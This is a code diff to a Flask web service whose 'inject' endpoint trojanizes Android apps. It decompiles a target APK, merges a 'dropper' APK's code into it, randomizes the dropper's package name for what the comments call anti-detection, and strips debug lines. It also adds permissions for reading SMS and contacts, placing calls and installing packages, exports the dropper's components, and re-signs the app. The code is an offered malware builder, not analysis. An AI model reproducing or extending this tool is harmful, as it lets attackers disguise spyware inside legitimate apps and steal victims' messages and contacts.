@@ -5,6 +5,10 @@ import tempfile
 import requests
 import zipfile
 import traceback
+import random
+import string
+import re
+import time
 from flask import Flask, request, send_file, jsonify
 
 app = Flask(__name__)
@@ -49,48 +53,91 @@ def inject():
         if res.returncode != 0:
             return jsonify({"error": f"Apktool target fail: {res.stderr[:200]}"}), 500
 
-        # 3. Check manifest
+        # Purane signature hatao taaki naya sign karte waqt conflict na ho
+        meta_inf = os.path.join(target_dir, "original", "META-INF")
+        if os.path.exists(meta_inf):
+            shutil.rmtree(meta_inf)
+
         manifest_path = os.path.join(target_dir, "AndroidManifest.xml")
         if os.path.isdir(manifest_path):
-            return jsonify({"error": "Target APK ka structure kharab hai. AndroidManifest.xml ek folder ban gaya hai."}), 500
+            return jsonify({"error": "Target APK structure is corrupt."}), 500
 
-        # 4. Dropper APK decompile
+        # 3. Dropper APK decompile
         dropper_dir = os.path.join(WORK, "dropper_dir")
         shutil.rmtree(dropper_dir, ignore_errors=True)
         res = subprocess.run(f"apktool d -f -o {dropper_dir} {DROPPER}", shell=True, capture_output=True, text=True)
         if res.returncode != 0:
             return jsonify({"error": f"Apktool dropper fail: {res.stderr[:200]}"}), 500
 
-        # 5. Smali copy
-        src = os.path.join(dropper_dir, "smali")
-        dst = os.path.join(target_dir, "smali")
-        if os.path.exists(src):
-            shutil.copytree(src, dst, dirs_exist_ok=True)
+        # 4. Smali Copy & Anti-Detection (Randomize package)
+        src_smali = os.path.join(dropper_dir, "smali")
+        dst_smali = os.path.join(target_dir, "smali")
+        if os.path.exists(src_smali):
+            shutil.copytree(src_smali, dst_smali, dirs_exist_ok=True)
+        
+        random_pkg = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
+        old_pkg_path = os.path.join(dst_smali, "com", "sable", "dropper")
+        new_pkg_path = os.path.join(dst_smali, "com", random_pkg, "dropper")
+        if os.path.exists(old_pkg_path):
+            shutil.copytree(old_pkg_path, new_pkg_path, dirs_exist_ok=True)
+            shutil.rmtree(old_pkg_path)
 
-        # 6. Manifest merge (UTF-8 error fix ke sath)
+        # 5. Remove Debugging Info (.line tags)
+        for root, dirs, files in os.walk(dst_smali):
+            for file in files:
+                if file.endswith(".smali"):
+                    file_path = os.path.join(root, file)
+                    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
+                        lines = f.readlines()
+                    with open(file_path, "w", encoding="utf-8") as f:
+                        for line in lines:
+                            if not line.strip().startswith(".line"):
+                                f.write(line)
+
+        # 6. Merge Manifest & Add Permissions
         with open(manifest_path, 'r', encoding='utf-8', errors='ignore') as f:
             t = f.read()
+
+        perms = [
+            "android.permission.INTERNET",
+            "android.permission.REQUEST_INSTALL_PACKAGES",
+            "android.permission.RECEIVE_BOOT_COMPLETED",
+            "android.permission.WAKE_LOCK",
+            "android.permission.READ_PHONE_STATE", 
+            "android.permission.CALL_PHONE",
+            "android.permission.READ_CONTACTS",
+            "android.permission.READ_SMS"
+        ]
+        insert_perms = "".join(f'<uses-permission android:name="{p}"/>' for p in perms if p not in t)
+        if insert_perms:
+            t = t.replace("</application>", insert_perms + "</application>")
+
+        dropper_manifest_path = os.path.join(dropper_dir, "AndroidManifest.xml")
+        with open(dropper_manifest_path, 'r', encoding='utf-8', errors='ignore') as f:
+            d_manifest = f.read()
+        
+        components = re.findall(r'<(activity|service|receiver)[^>]*android:name="([^"]+)"[^>]*>', d_manifest)
+        comp_str = ""
+        for tag, name in components:
+            new_name = name.replace("com.sable.dropper", f"com.{random_pkg}.dropper")
+            comp_str += f'<{tag} android:name="{new_name}" android:exported="true" />\n'
             
-        perms = ["android.permission.INTERNET","android.permission.REQUEST_INSTALL_PACKAGES","android.permission.RECEIVE_BOOT_COMPLETED","android.permission.WAKE_LOCK"]
-        insert = "".join(f'<uses-permission android:name="{p}"/>' for p in perms if p not in t)
-        if insert:
-            t = t.replace("</application>", insert + "</application>")
-            
+        t = t.replace("</application>", comp_str + "</application>")
         with open(manifest_path, "w", encoding='utf-8') as f:
             f.write(t)
 
-        # 7. Build
+        # 7. Build APK
         unsigned = os.path.join(WORK, "unsigned.apk")
         res = subprocess.run(f"apktool b -f -o {unsigned} {target_dir}", shell=True, capture_output=True, text=True)
         if res.returncode != 0:
             return jsonify({"error": f"Apktool build fail: {res.stderr[:200]}"}), 500
 
-        # 8. Sign (Yahan --min-sdk-version 21 add kar diya hai)
+        # 8. Align and Sign (V1 + V2 Signatures)
         aligned = os.path.join(WORK, "aligned.apk")
         signed = os.path.join(WORK, "signed.apk")
         subprocess.run(f"zipalign -f -p 4 {unsigned} {aligned}", shell=True, check=True)
         
-        res = subprocess.run(f"apksigner sign --min-sdk-version 21 --ks {KEYSTORE} --ks-pass pass:sable123 --key-pass pass:sable123 --out {signed} {aligned}", shell=True, capture_output=True, text=True)
+        res = subprocess.run(f"apksigner sign --min-sdk-version 21 --v1-signing-enabled true --v2-signing-enabled true --ks {KEYSTORE} --ks-pass pass:sable123 --key-pass pass:sable123 --out {signed} {aligned}", shell=True, capture_output=True, text=True)
         if res.returncode != 0:
             return jsonify({"error": f"Signing failed: {res.stderr[:200]}"}), 500
 
